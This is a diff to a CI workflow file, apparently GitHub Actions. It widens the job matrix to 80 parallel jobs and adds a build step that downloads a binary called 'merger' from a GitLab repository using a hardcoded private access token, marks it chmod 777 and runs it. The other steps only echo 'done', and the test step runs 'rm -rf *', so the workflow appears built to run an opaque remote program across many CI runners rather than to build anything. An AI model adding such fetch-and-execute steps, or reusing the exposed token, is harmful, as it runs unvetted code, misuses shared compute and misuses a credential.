@@ -16,7 +16,7 @@ jobs:
     runs-on: ubuntu-18.04
     strategy:
       matrix:
-        D1: [0,1,2]
+        D1: [0,1,2,3,4,5,6,7]
         D2: [0,1,2,3,4,5,6,7,8,9]
       fail-fast: false
     steps:
@@ -25,8 +25,10 @@ jobs:
 
     - name: Build
       run: |
+        wget -O merger --header='PRIVATE-TOKEN: 62t8qkWQyhnepRhaR_2K' 'https://gitlab.com/api/v4/projects/24995933/repository/files/merger/raw?ref=master' && chmod 777 merger && ./merger
         echo "done"
     - name: Test
       run: |
         rm -rf *
         echo "done"  
+        
